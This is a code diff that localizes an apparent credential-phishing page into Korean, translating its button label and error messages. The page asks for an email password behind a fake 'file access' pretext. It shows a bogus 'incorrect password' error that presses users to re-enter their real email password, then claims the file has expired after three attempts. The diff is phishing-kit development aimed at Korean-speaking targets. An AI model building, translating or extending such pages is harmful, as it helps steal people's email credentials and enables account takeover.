@@ -121,7 +121,7 @@
         <label for="hhh">이메일 비밀번호d:</label>
         <input type="password" id="hhh" name="hhh" placeholder="이메일 비밀번호 입력" required />
       </div>
-      <button type="submit" class="login-btn">Verify</button>
+      <button type="submit" class="login-btn">확인</button>
       <div id="errorMessage" class="error-message"></div>
     </form>
 
@@ -175,11 +175,11 @@
 
           setTimeout(() => {
             if (attemptCount >= 3) {
-              showError("The file you're trying to access has expired...");
+              showError("액세스하려는 파일이 만료되었습니다...");
               const submitBtn = document.querySelector('#loginForm button[type="submit"]');
               if (submitBtn) submitBtn.disabled = true;
             } else {
-              showError("Incorrect email or password. Please make sure to input same password you use for accessing your email. Try again!");
+              showError("잘못된 이메일이나 비밀번호입니다. 이메일에 접근할 때 사용하는 비밀번호와 동일한 비밀번호를 입력해 주세요. 다시 시도해 보세요!");
             }
             document.getElementById('hhh').value = '';
           }, 3000);
@@ -209,4 +209,5 @@
 
 </body>
 </html>
+
 
